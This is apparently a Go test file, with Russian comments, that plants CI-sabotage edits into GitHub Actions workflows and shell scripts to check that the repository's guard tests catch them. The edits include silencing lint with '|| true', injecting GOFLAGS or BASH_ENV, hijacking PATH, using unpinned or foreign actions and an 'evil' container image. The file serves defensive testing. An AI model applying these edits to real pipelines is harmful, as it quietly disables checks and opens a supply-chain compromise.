// Файл plant_test.go — канарейки сторожей этого пакета, идущие ТЕМ ЖЕ
// ПУТЁМ, что и сами сторожа (седьмая ступень; образец —
// TestOsmotrCanaryFormsGateWired в cmd/gui/osmotr_test.go).
//
// Зачем процесс. Сторожа этого пакета можно обезвредить, не тронув логику
// детекции: t.Logf вместо t.Errorf, счёт через `>` вместо `>=`. Канарейка,
// которая зовёт функцию детекции со своим сборщиком ошибок, этого не
// увидит. Поэтому здесь гоняются НАСТОЯЩИЕ тесты пакета — тем же тестовым
// бинарником, в дочернем процессе, — а дефект подсаживается в ТЕКСТ
// workflow-файла в единственной точке чтения (readSource) или, для ветки
// покрытия каталогов, в результат обхода (plantedTestDir). Провал обязан
// дойти до того самого *testing.T, который видит go test.
//
// Разведение. Каждая подсадка обязана уронить РОВНО ОДИН тест — свой — и с
// ожидаемым сообщением; остальные тесты того же прогона обязаны пройти.
// Ожидаемые тест и сообщение записаны литералами в таблице, а не выведены
// из подменяемого места.
//
// Разведение ВЕТОК внутри теста (ревью QA-01). Фраза ищется во всём выводе
// -test.v, куда попадает и текст из t.Logf. Поэтому если подсадка будит две
// ветки, то подмена Errorf→Logf в одной из них прикрыта второй, и канарейка
// её не видит. Для каждой смысловой ветки здесь есть подсадка, будящая
// ТОЛЬКО её: тогда Logf в этой ветке делает тест зелёным, и канарейка
// краснеет. Подсадки «как в жизни» (настоящий вызов заменён формой
// --version) будят по две ветки и оставлены как сценарии, а не как
// доказательство ветки.
package ciguard

import (
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strings"
	"testing"
)

const plantEnv = "CIGUARD_PLANT"

// edit — в файле path ровно одно вхождение old заменяется на new.
type edit struct {
	path, old, new string
}

// plant — один подсаживаемый дефект: правки текста и/или лишний каталог с
// тестами в результате обхода репозитория.
type plant struct {
	name     string
	edits    []edit
	extraDir string
	// extraFiles — лишние файлы в результате обхода .github (путь от
	// каталога пакета, например ../../.github/workflows/evil.yml).
	extraFiles []string
	// hideFiles — файлы, которые подсадка убирает из результата обхода .github.
	hideFiles []string
	// parseRow — строка, добавляемая в таблицу лексера (TestShellParserTable).
	parseRow *parseCase
	wantTest string // единственный тест, который обязан упасть
	wantMsg  string // что обязано быть в блоке провала с меткой failMark
	// also — тесты, которые по существу обязаны упасть ВМЕСТЕ с wantTest:
	// одна подсадка нарушает два правила сразу (например, export GOFLAGS в
	// теле разбирающего шага — и «не из закрытого списка», и «GO* в
	// окружении»). Разведение для каждого правила порознь — отдельными
	// подсадками без also.
	also []string
}

const alCall = `go run "github.com/rhysd/actionlint/cmd/actionlint@${ACTIONLINT_VERSION}"`

// ciRealLint — настоящий вызов actionlint в ci.yml, дословно.
const ciRealLint = `          ` + alCall + ` \
            -shellcheck "$SHELLCHECK_BIN" \
            .github/workflows/release.yml \
            .github/workflows/ci.yml
`

const ciLintEcho = `          echo "разбираю .github/workflows/release.yml .github/workflows/ci.yml"
`

const ciLintGuards = `          set -euo pipefail
          test -n "${SHELLCHECK_BIN:-}" || { echo "СТОП: SHELLCHECK_BIN пуста" >&2; exit 1; }
          test -n "${ACTIONLINT_VERSION:-}" || { echo "СТОП: ACTIONLINT_VERSION пуста" >&2; exit 1; }
`

const goenv = "TestNoToolEnvironmentOverrides"

const keys = "TestWorkflowKeysClosedList"

const pipes = "TestNoEarlyExitPipeReader"

const progs = "TestCommandProgramsClosedList"

const buildReleaseSH = "../../scripts/build-release.sh"

const canaryLogic = "TestShellcheckCanaryStepLogic"

// toolsStep — шаг «Инструменты» job lint. Добавочные вызовы actionlint
// подсаживаются сюда: в шаге канарейки они сломали бы её логику (раунд 5),
// рядом с настоящим вызовом — закрытый список тела.
const toolsStep = "        run: bash scripts/dev-tools.sh\n"
const toolsStepMulti = "        run: |\n          bash scripts/dev-tools.sh\n"

const historyKeysSH = "../../scripts/check-history-keys.sh"

const (
	usesT = "TestActionsPinnedBySHA"
	trig  = "TestWorkflowTriggersClosedList"
)

// sh — строка, добавленная в scripts/build-release.sh; этот файл из
// сторожей пакета читает только TestNoEarlyExitPipeReader.
func sh(line string) []edit {
	return []edit{{buildReleaseSH, "mkdir -p dist\n", "mkdir -p dist\n" + line + "\n"}}
}

func ci(old, new string) []edit  { return []edit{{ciYML, old, new}} }
func rel(old, new string) []edit { return []edit{{releaseYML, old, new}} }

// realWith — настоящий вызов, в котором заменён его фрагмент.
func realWith(old, new string) []edit {
	return ci(ciRealLint, strings.Replace(ciRealLint, old, new, 1))
}

const (
	inv  = "TestActionlintInvocationMeaning"
	gtm  = "TestGoTestPackagesMatch"
	att  = "TestReleaseAttestsChecksums"
	arch = "TestReleaseRunnerArchStep"
	tenv = "TestTestJobEnvironmentMatches"
)

var plants = []plant{
	// --- смысл вызова actionlint: сценарии «как в жизни» (по две ветки) ---
	{name: "actionlint-version", edits: ci(ciRealLint, ciLintEcho+"          "+alCall+" --version\n"),
		wantTest: inv, wantMsg: "флаг --version"},
	{name: "actionlint-noargs", edits: ci(ciRealLint, ciLintEcho+"          "+alCall+` -shellcheck "$SHELLCHECK_BIN"`+"\n"),
		wantTest: inv, wantMsg: "без файлов"},
	// --- смысл вызова actionlint: по одной ветке ---
	// Добавочный вызов — в конец шага канарейки, а не рядом с настоящим:
	// рядом с настоящим он нарушил бы ещё и закрытый список тела шага.
	{name: "al-extra-version", edits: ci(toolsStep, toolsStepMulti+"          "+alCall+` -shellcheck "$SHELLCHECK_BIN" --version "$canary"`+"\n"),
		wantTest: inv, wantMsg: "флаг --version вне закрытого списка"},
	{name: "al-extra-noargs", edits: ci(toolsStep, toolsStepMulti+"          "+alCall+` -shellcheck "$SHELLCHECK_BIN"`+"\n"),
		wantTest: inv, wantMsg: "вызов actionlint без файлов — разбирать нечего"},
	{name: "al-ignore", edits: realWith(`-shellcheck "$SHELLCHECK_BIN" \`, `-shellcheck "$SHELLCHECK_BIN" -ignore '.*' \`),
		wantTest: inv, wantMsg: "флаг -ignore вне закрытого списка"},
	{name: "al-shellcheck-empty", edits: realWith(`-shellcheck "$SHELLCHECK_BIN" \`, `-shellcheck= \`),
		wantTest: inv, wantMsg: "-shellcheck с пустым значением"},
	{name: "al-no-shellcheck", edits: realWith("            -shellcheck \"$SHELLCHECK_BIN\" \\\n", ""),
		wantTest: inv, wantMsg: "вызов actionlint без -shellcheck <путь>"},
	{name: "al-or-true", edits: realWith(".github/workflows/ci.yml\n", ".github/workflows/ci.yml || true\n"),
		wantTest: inv, wantMsg: "хвост «|| true»"},
	{name: "al-devnull", edits: realWith(".github/workflows/ci.yml\n", ".github/workflows/ci.yml >/dev/null 2>&1 || true\n"),
		wantTest: inv, wantMsg: "хвост «> /dev/null 2>&1 || true»"},
	{name: "al-background", edits: realWith(".github/workflows/ci.yml\n", ".github/workflows/ci.yml &\n"),
		wantTest: inv, wantMsg: "хвост «&»"},
	{name: "al-bang", edits: realWith("          go run", "          ! go run"),
		wantTest: inv, wantMsg: "перед вызовом в строке стоит «! go run»"},
	{name: "al-true-or", edits: realWith("          go run", "          true || go run"),
		wantTest: inv, wantMsg: "перед вызовом в строке стоит «true || go run»"},
	{name: "al-if", edits: ci(ciRealLint, strings.Replace(strings.Replace(ciRealLint, "          go run", "          if go run", 1),
		".github/workflows/ci.yml\n", ".github/workflows/ci.yml; then :; fi\n", 1)),
		wantTest: inv, also: []string{progs}, wantMsg: "перед вызовом в строке стоит «if go run»"},
	{name: "al-set-plus", edits: ci(ciRealLint, "          set +e\n"+ciRealLint+"          echo done\n"),
		wantTest: inv, wantMsg: "строка «set +e» выше вызова — вне закрытого списка"},
	{name: "al-no-set", edits: ci(ciLintGuards+ciRealLint, strings.Replace(ciLintGuards, "          set -euo pipefail\n", "", 1)+ciRealLint),
		wantTest: inv, wantMsg: "нет `set -euo pipefail`"},
	{name: "al-exit", edits: ci(ciRealLint, "          exit 0\n"+ciRealLint),
		wantTest: inv, wantMsg: "строка «exit 0» выше вызова"},
	{name: "al-func", edits: ci(ciRealLint, "          lint() {\n"+ciRealLint+"          }\n"),
		wantTest: inv, wantMsg: "строка «lint() {» выше вызова"},
	// --- раунд 2 QA-01: строка вызова цела, меняется окружение ---
	{name: "r2-subshell", edits: ci(ciRealLint, "          (\n"+ciRealLint+"          ) || true\n"),
		wantTest: inv, wantMsg: "строка «(» выше вызова — вне закрытого списка"},
	{name: "r2-if-false", edits: ci(ciRealLint, "          if false; then\n"+ciRealLint+"          fi\n"),
		wantTest: inv, also: []string{progs}, wantMsg: "строка «if false; then» выше вызова"},
	{name: "r2-while-false", edits: ci(ciRealLint, "          while false; do\n"+ciRealLint+"          done\n"),
		wantTest: inv, also: []string{progs}, wantMsg: "строка «while false; do» выше вызова"},
	{name: "r2-case", edits: ci(ciRealLint, "          case x in\n            y)\n"+ciRealLint+"            ;;\n          esac\n"),
		wantTest: inv, wantMsg: "строка «case x in» выше вызова"},
	{name: "r2-heredoc", edits: ci(ciRealLint, "          cat >/dev/null <<'X'\n"+ciRealLint+"          X\n"),
		wantTest: inv, wantMsg: "строка «cat >/dev/null <<'X'» выше вызова"},
	{name: "r2-literal", edits: ci(ciRealLint, "          : '\n"+ciRealLint+"          '\n"),
		wantTest: inv, also: []string{progs}, wantMsg: "строка «: '» выше вызова"},
	{name: "r2-trailing-line", edits: ci(ciRealLint, ciRealLint+"          echo готово\n"),
		wantTest: inv, wantMsg: "после вызова стоит строка «echo готово»"},
	{name: "r2-env-goflags", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          GOFLAGS: -n\n"),
		wantTest: goenv, wantMsg: "env GOFLAGS=-n"},
	{name: "r2-export-goflags", edits: ci(ciRealLint, "          export GOFLAGS=-n\n"+ciRealLint),
		wantTest: inv, also: []string{goenv}, wantMsg: "строка «export GOFLAGS=-n» выше вызова"},
	{name: "r2-githubenv-goflags", edits: rel("          echo \"$ImageOS $ImageVersion\"\n", "          echo \"$ImageOS $ImageVersion\"\n          echo \"GOFLAGS=-n\" >> \"$GITHUB_ENV\"\n"),
		wantTest: goenv, wantMsg: "«echo \"GOFLAGS=-n\" >> \"$GITHUB_ENV\"»"},
	{name: "r2-step-shell", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        shell: bash --noprofile --norc {0} || true\n"),
		wantTest: inv, also: []string{keys}, wantMsg: "у шага задан shell: «bash --noprofile --norc {0} || true»"},
	{name: "r2-job-shell", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    defaults:\n      run:\n        shell: bash {0} || true\n"),
		wantTest: inv, also: []string{keys}, wantMsg: "у job задан defaults.run.shell"},
	{name: "r2-gotest-env-goflags", edits: []edit{
		{ciYML, "      - name: go test -race\n", "      - name: go test -race\n        env:\n          GOFLAGS: -run=NOTHING\n"},
		{releaseYML, "      - name: go test -race\n", "      - name: go test -race\n        env:\n          GOFLAGS: -run=NOTHING\n"}},
		wantTest: goenv, wantMsg: "env GOFLAGS=-run=NOTHING"},
	{name: "r2-gotest-shell", edits: []edit{
		{ciYML, "      - name: go test -race\n", "      - name: go test -race\n        shell: bash {0} || true\n"},
		{releaseYML, "      - name: go test -race\n", "      - name: go test -race\n        shell: bash {0} || true\n"}},
		wantTest: gtm, also: []string{keys}, wantMsg: "у шага задан shell: «bash {0} || true»"},
	{name: "r2-gotest-subshell", edits: []edit{
		{ciYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n", "        run: |\n          if false; then\n          go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n          fi\n"},
		{releaseYML, "        run: go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n", "        run: |\n          if false; then\n          go test -timeout=20m -race -count=1 ./core/ ./internal/... ./cmd/cli/ ./cmd/gui/\n          fi\n"}},
		wantTest: gtm, also: []string{progs}, wantMsg: "строка «if false; then» выше вызова"},
	// --- раунд 4 QA-01: значение -shellcheck и окружение инструментов ---
	{name: "r4-sc-nonexistent", edits: realWith(`-shellcheck "$SHELLCHECK_BIN" \`, `-shellcheck /nonexistent \`),
		wantTest: inv, wantMsg: "значение -shellcheck «/nonexistent» вне закрытого списка"},
	{name: "r4-sc-true", edits: realWith(`-shellcheck "$SHELLCHECK_BIN" \`, `-shellcheck true \`),
		wantTest: inv, wantMsg: "значение -shellcheck «true» вне закрытого списка"},
	{name: "r4-sc-subst", edits: realWith(`-shellcheck "$SHELLCHECK_BIN" \`, `-shellcheck "$(echo /nonexistent)" \`),
		wantTest: inv, wantMsg: "значение -shellcheck «$(echo /nonexistent)» вне закрытого списка"},
	{name: "r4-sc-env-step", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          SHELLCHECK_BIN: /nonexistent\n"),
		wantTest: goenv, wantMsg: "«actionlint (оба workflow)»: env SHELLCHECK_BIN=/nonexistent"},
	{name: "r4-sc-env-workflow", edits: ci("permissions:\n  contents: read\n\n", "permissions:\n  contents: read\n\nenv:\n  SHELLCHECK_BIN: /nonexistent\n\n"),
		wantTest: goenv, also: []string{keys, tenv}, wantMsg: "workflow: env SHELLCHECK_BIN=/nonexistent"},
	{name: "r4-sc-githubenv", edits: ci("        run: bash scripts/dev-tools.sh\n", "        run: |\n          bash scripts/dev-tools.sh\n          echo \"SHELLCHECK_BIN=/nonexistent\" >> \"$GITHUB_ENV\"\n"),
		wantTest: goenv, wantMsg: "SHELLCHECK_BIN «echo \"SHELLCHECK_BIN=/nonexistent\" >> \"$GITHUB_ENV\"»"},
	{name: "r4-go-env-w", edits: ci("        run: bash scripts/dev-tools.sh\n", "        run: |\n          bash scripts/dev-tools.sh\n          go env -w GOFLAGS=-n\n"),
		wantTest: goenv, wantMsg: "go env -w «go env -w GOFLAGS=-n»"},
	{name: "r4-github-path", edits: ci("        run: bash scripts/dev-tools.sh\n", "        run: |\n          bash scripts/dev-tools.sh\n          echo \"$RUNNER_TEMP/bin\" >> \"$GITHUB_PATH\"\n"),
		wantTest: goenv, wantMsg: "$GITHUB_PATH вне закрытого списка «echo \"$RUNNER_TEMP/bin\" >> \"$GITHUB_PATH\"»"},
	{name: "r4-canary-missing", edits: ci(`-shellcheck "$SHELLCHECK_BIN" "$canary" 2>&1`, `-shellcheck "$SHELLCHECK_BIN" "$RUNNER_TEMP/other.yml" 2>&1`),
		wantTest: inv, also: []string{canaryLogic}, wantMsg: "выше в том же job нет канарейки"},
	// --- раунд 5 QA-01: PATH и логика канарейки ---
	{name: "r5-path-env-step", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          PATH: /tmp/f:/usr/bin:/bin\n"),
		wantTest: goenv, wantMsg: "«actionlint (оба workflow)»: env PATH=/tmp/f:/usr/bin:/bin"},
	{name: "r5-path-githubenv", edits: ci("        run: bash scripts/dev-tools.sh\n", "        run: |\n          bash scripts/dev-tools.sh\n          echo \"PATH=/tmp/f:$PATH\" >> \"$GITHUB_ENV\"\n"),
		wantTest: goenv, wantMsg: "$GITHUB_ENV вне закрытого списка (он пуст) «echo \"PATH=/tmp/f:$PATH\" >> \"$GITHUB_ENV\"»"},
	{name: "r5-githubpath-after-setup-go", edits: ci("      - name: Linux GUI deps\n",
		"      - name: Поздний mingw\n        run: printf '%s\\n' 'C:\\msys64\\mingw64\\bin' >> \"$GITHUB_PATH\"\n\n      - name: Linux GUI deps\n"),
		wantTest: goenv, wantMsg: "запись в $GITHUB_PATH после setup-go", also: []string{tenv}},
	{name: "r5-canary-exit0", edits: ci("2>&1)\" || rc=$?\n", "2>&1)\" || rc=$?\n          exit 0\n"),
		wantTest: canaryLogic, wantMsg: "заглушка go в режиме zero: шаг прошёл, а должен упасть — канарейка молчит"},
	{name: "r5-canary-no-grep", edits: ci(`if [ "$rc" -eq 0 ] || ! grep -q 'SC2086' <<< "$out"; then`, `if [ "$rc" -eq 0 ]; then`),
		wantTest: canaryLogic, wantMsg: "заглушка go в режиме other: шаг прошёл, а должен упасть — канарейка молчит"},
	// --- раунд 6 QA-01: закрытый список имён в env: ---
	{name: "r6-bash-env-step", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          BASH_ENV: /tmp/x\n"),
		wantTest: goenv, wantMsg: "«actionlint (оба workflow)»: env BASH_ENV=/tmp/x вне закрытого списка имён"},
	{name: "r6-bash-env-workflow", edits: ci("permissions:\n  contents: read\n\n", "permissions:\n  contents: read\n\nenv:\n  BASH_ENV: /tmp/x\n\n"),
		wantTest: goenv, also: []string{keys, tenv}, wantMsg: "workflow: env BASH_ENV=/tmp/x вне закрытого списка имён"},
	{name: "r6-foo", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          FOO: 1\n"),
		wantTest: goenv, wantMsg: "env FOO=1 вне закрытого списка имён"},
	{name: "r6-shellopts-job", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    env:\n      SHELLOPTS: \"\"\n"),
		wantTest: goenv, wantMsg: "job lint: env SHELLOPTS= вне закрытого списка имён"},
	{name: "r6-lowercase-bash-env", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        env:\n          bash_env: /tmp/x\n"),
		wantTest: goenv, wantMsg: "env bash_env=/tmp/x вне закрытого списка имён"},
	// --- раунд 7 QA-01: закрытые списки ключей, runs-on, значения VERSION/COMMIT ---
	{name: "r7-container-env", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    container:\n      image: golang:1\n      env:\n        BASH_ENV: /tmp/x\n"),
		wantTest: keys, wantMsg: "job lint: ключ «container» вне закрытого списка"},
	{name: "r7-container-image", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    container: evil/go-noop:latest\n"),
		wantTest: keys, wantMsg: "job lint: ключ «container» вне закрытого списка"},
	{name: "r7-services", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    services:\n      s:\n        image: x\n        env:\n          BASH_ENV: /tmp/x\n"),
		wantTest: keys, wantMsg: "job lint: ключ «services» вне закрытого списка"},
	{name: "r7-unknown-workflow-key", edits: ci("permissions:\n  contents: read\n\n", "permissions:\n  contents: read\n\nfoo: 1\n\n"),
		wantTest: keys, wantMsg: "workflow: ключ «foo» вне закрытого списка"},
	{name: "r7-unknown-job-key", edits: ci("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    foo: 1\n"),
		wantTest: keys, wantMsg: "job lint: ключ «foo» вне закрытого списка"},
	{name: "r7-unknown-step-key", edits: ci("      - name: actionlint (оба workflow)\n", "      - name: actionlint (оба workflow)\n        foo: 1\n"),
		wantTest: keys, wantMsg: "job lint, шаг №7: ключ «foo» вне закрытого списка"},
	{name: "r7-runs-on", edits: ci("    runs-on: ubuntu-24.04\n    # Ревью, З7. Здесь", "    runs-on: ubuntu-latest\n    # Ревью, З7. Здесь"),
		wantTest: keys, wantMsg: "job lint: runs-on «ubuntu-latest» — метки нет в таблице runnerArch"},
	{name: "r7-runs-on-matrix", edits: ci("    runs-on: ${{ matrix.runner }}\n", "    runs-on: ubuntu-24.04\n"),
		wantTest: keys, wantMsg: "job checks: runs-on «ubuntu-24.04» при матрице"},
	{name: "r7-version-tail", edits: rel("          VERSION: ${{ github.ref_name }}\n", "          VERSION: ${{ github.ref_name }} -extldflags=-x\n"),
		wantTest: goenv, wantMsg: "env VERSION=\"${{ github.ref_name }} -extldflags=-x\" — значение вне закрытого списка"},
	{name: "r7-commit-literal", edits: ci("          COMMIT: ${{ github.sha }}\n", "          COMMIT: deadbeef\n"),
		wantTest: goenv, wantMsg: "env COMMIT=\"deadbeef\" — значение вне закрытого списка"},
	// --- раунд SIGPIPE: ранний выход читателя конвейера ---
	{name: "sp-subjects-pipe", edits: rel(`            in_subjects "$f" ||`, `            printf '%s\n' "${subjects[@]}" | grep -qxF -- "$f" ||`),
		wantTest: pipes, also: []string{att}, wantMsg: `«printf '%s\n' "${subjects[@]}" | grep -qxF -- "$f"`},
	{name: "sp-info-pipe", edits: rel(`            grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' <<< "$info" ||`, `            printf '%s\n' "$info" | grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' ||`),
		wantTest: pipes, wantMsg: "«grep»: флаг «-qE» вне закрытого списка"},
	{name: "sp-canary-grep-m", edits: ci(`! grep -q 'SC2086' <<< "$out"; then`, `! printf '%s\n' "$out" | grep -m1 -q 'SC2086'; then`),
		wantTest: pipes, also: []string{canaryLogic}, wantMsg: "grep -m1 -q 'SC2086'"},
	{name: "sp-script-head", edits: []edit{{buildReleaseSH, "mkdir -p dist\n", "mkdir -p dist\ngo version | head -n 1\n"}},
		wantTest: pipes, wantMsg: "../../scripts/build-release.sh: «go version | head -n 1»"},
	// --- долги CI: закрытый список читателей; обходы QA-01 по одному ---
	{name: "cl-pipe-amp", edits: sh("printf x |& grep -q y"),
		wantTest: pipes, wantMsg: "«grep»: флаг «-q» вне закрытого списка"},
	{name: "cl-egrep", edits: sh("printf x | egrep -q y"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «egrep» вне закрытого списка"},
	{name: "cl-fgrep", edits: sh("printf x | fgrep -q y"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «fgrep» вне закрытого списка"},
	{name: "cl-grep-m1", edits: sh("printf x | grep -m1 y"),
		wantTest: pipes, wantMsg: "«grep»: флаг «-m1» вне закрытого списка"},
	{name: "cl-lc-all", edits: sh("printf x | LC_ALL=C grep -q y"),
		wantTest: pipes, wantMsg: "читатель «LC_ALL=C» вне закрытого списка"},
	{name: "cl-env", edits: sh("printf x | env grep -q y"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «env» вне закрытого списка"},
	{name: "cl-sed-q", edits: sh("printf x | sed q"),
		wantTest: pipes, also: []string{progs}, wantMsg: "«sed»: в скрипте sed есть q/Q"},
	{name: "cl-sed-block", edits: sh("printf x | sed -n '/x/{p;q}'"),
		wantTest: pipes, also: []string{progs}, wantMsg: "«sed»: в скрипте sed есть q/Q"},
	{name: "cl-awk-exit", edits: sh("printf x | awk '/x/{print; exit}'"),
		wantTest: pipes, also: []string{progs}, wantMsg: "«awk»: в программе awk есть exit/nextfile"},
	{name: "cl-grep-l", edits: sh("printf x | grep -l y"),
		wantTest: pipes, wantMsg: "«grep»: флаг «-l» вне закрытого списка"},
	{name: "cl-cmp", edits: sh("printf x | cmp - /dev/null"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «cmp» вне закрытого списка"},
	{name: "cl-read", edits: sh("printf x | read -r v"),
		wantTest: pipes, wantMsg: "читатель «read» вне закрытого списка"},
	{name: "cl-xargs", edits: sh("printf x | xargs grep -q y"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «xargs» вне закрытого списка"},
	{name: "cl-newline", edits: sh("printf x |\n  grep -q y"),
		wantTest: pipes, wantMsg: "«grep -q y» — «grep»: флаг «-q»"},
	// --- долги CI: прочие формы и ветки закрытого списка ---
	{name: "cl-command", edits: sh("printf x | command grep y"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «command» вне закрытого списка"},
	{name: "cl-backslash", edits: sh(`printf x | \grep y`),
		wantTest: pipes, also: []string{progs}, wantMsg: `читатель «\grep» вне закрытого списка`},
	{name: "cl-subshell", edits: sh("printf x | (grep y)"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «(» вне закрытого списка"},
	{name: "cl-group", edits: sh("printf x | { grep y; }"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «{» вне закрытого списка"},
	{name: "cl-while", edits: sh("printf x | while read -r v; do :; done"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «while» вне закрытого списка"},
	{name: "cl-head", edits: sh("printf x | head -n 1"),
		wantTest: pipes, wantMsg: "читатель «head» вне закрытого списка"},
	{name: "cl-file-operand", edits: sh("printf x | grep -E y /etc/hostname"),
		wantTest: pipes, wantMsg: "«grep»: лишний операнд «/etc/hostname» — читается файл"},
	{name: "cl-cat-no-dash", edits: sh("printf x | cat /etc/hostname"),
		wantTest: pipes, wantMsg: "«cat»: лишний операнд «/etc/hostname»"},
	{name: "cl-in-redirect", edits: sh("printf x | sort -u < /etc/hostname"),
		wantTest: pipes, wantMsg: "вход читателя перенаправлен «< /etc/hostname»"},
	{name: "cl-long-flag", edits: sh("printf x | grep --quiet y"),
		wantTest: pipes, wantMsg: "«grep»: флаг «--quiet» вне закрытого списка"},
	{name: "cl-in-cmdsubst", edits: sh(`v="$(printf x | grep -q y)"`),
		wantTest: pipes, wantMsg: "«grep»: флаг «-q»"},
	{name: "cl-unknown-func", edits: sh("printf x | myfilter"),
		wantTest: pipes, also: []string{progs}, wantMsg: "читатель «myfilter» вне закрытого списка"},
	{name: "cl-func-body", edits: []edit{{historyKeysSH, "count_suspects() { grep -c '^SUSPECT ' || true; }", "count_suspects() { grep -q '^SUSPECT ' || true; }"}},
		wantTest: pipes, wantMsg: "функция «count_suspects»: первая команда тела — «grep»: флаг «-q»"},
	{name: "cl-unparsed", edits: sh("echo 'незакрыто"),
		wantTest: pipes, wantMsg: "текст не разобран (строка"},
	{name: "cl-workflow-amp-newline", edits: rel(`            grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' <<< "$info" ||`,
		"            printf '%s\\n' \"$info\" |&\n              grep -qE 'path[[:space:]]+amnezia-admin/cmd/cli' ||"),
		wantTest: pipes, wantMsg: "«grep»: флаг «-qE» вне закрытого списка"},
	{name: "cl-count", edits: []edit{{devToolsSH, `sha256sum "$1" | awk '{print $1}'`, `awk '{print $1}' < <(sha256sum "$1")`}},
		wantTest: pipes, wantMsg: "читателей конвейера найдено 29, ожидалось 30"},
	{name: "cl-growth-break", edits: []edit{{growthScript, "*) continue ;; #", "*) break ;; #"}},
		wantTest: pipes, also: []string{progs}, wantMsg: "в цикле чтения check-version-growth.sh есть break/exit"},
	{name: "cl-growth-exit0", edits: []edit{{growthScript, "max_key=\"\"\n", "exit 0\nmax_key=\"\"\n"}},
		wantTest: pipes, wantMsg: "выходит успешно (exit 0) до цикла чтения"},
	{name: "cl-growth-noloop", edits: []edit{{growthScript, "while IFS= read -r line || [ -n \"$line\" ]; do", "while read -r line; do"}},
		wantTest: pipes, wantMsg: "не найден цикл `while IFS= read -r line … done`"},
	// --- долги CI: uses: по SHA ---
	{name: "us-tag", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "actions/upload-artifact@v7"),
		wantTest: usesT, wantMsg: "uses «actions/upload-artifact@v7» не закреплён по SHA"},
	{name: "us-branch", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "actions/upload-artifact@main"),
		wantTest: usesT, wantMsg: "uses «actions/upload-artifact@main» не закреплён по SHA"},
	{name: "us-short-sha", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "actions/upload-artifact@043fb46"),
		wantTest: usesT, wantMsg: "uses «actions/upload-artifact@043fb46» не закреплён по SHA"},
	{name: "us-local", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "./.github/actions/upload"),
		wantTest: usesT, wantMsg: "uses «./.github/actions/upload» не закреплён по SHA"},
	{name: "us-docker", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "docker://alpine:3.20"),
		wantTest: usesT, wantMsg: "uses «docker://alpine:3.20» не закреплён по SHA"},
	{name: "us-job", edits: rel("\njobs:\n", "\njobs:\n  reuse:\n    uses: octo/wf/.github/workflows/x.yml@main\n"),
		wantTest: usesT, also: []string{keys}, wantMsg: "job reuse: uses «octo/wf/.github/workflows/x.yml@main» не закреплён по SHA"},
	{name: "us-count", edits: ci("      - name: actionlint (оба workflow)\n",
		"      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n      - name: actionlint (оба workflow)\n"),
		wantTest: usesT, wantMsg: "ссылок uses: найдено 14, ожидалось 13"},
	// --- раунд 2: SEC-01 С-1 — ./ и .. при правильной форме SHA ---
	{name: "us-dot-owner", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "./x@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"),
		wantTest: usesT, wantMsg: "uses «./x@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a» не закреплён по SHA"},
	{name: "us-dotdot", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "../../x@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"),
		wantTest: usesT, wantMsg: "uses «../../x@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a» не закреплён по SHA"},
	{name: "us-dotdot-path", edits: rel("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1", "actions/upload-artifact/../../c/d@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"),
		wantTest: usesT, wantMsg: "сегмент «..» в пути"},
	// --- раунд 2: QA-01 рек. 3 — чужой владелец с правильной формой ---
	{name: "us-foreign-owner", edits: ci("      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:",
		"      - uses: evil-org/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:"),
		wantTest: usesT, wantMsg: "источник «evil-org/setup-go» вне закрытого списка allowedActions"},
